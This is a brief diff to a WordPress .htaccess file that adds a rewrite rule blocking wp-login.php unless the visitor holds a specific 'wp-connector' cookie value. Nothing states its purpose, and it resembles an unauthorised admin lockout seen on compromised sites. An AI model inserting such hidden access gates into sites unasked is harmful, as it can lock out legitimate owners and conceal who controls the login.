@@ -1,3 +1,9 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_COOKIE} !^.*wp\-connector=2917998723.*$ [NC]
+RewriteRule wp-login.php - [F]
+</IfModule>
 
 # BEGIN WordPress
 # De richtlijnen (regels) tussen "BEGIN WordPress" en "END WordPress" worden
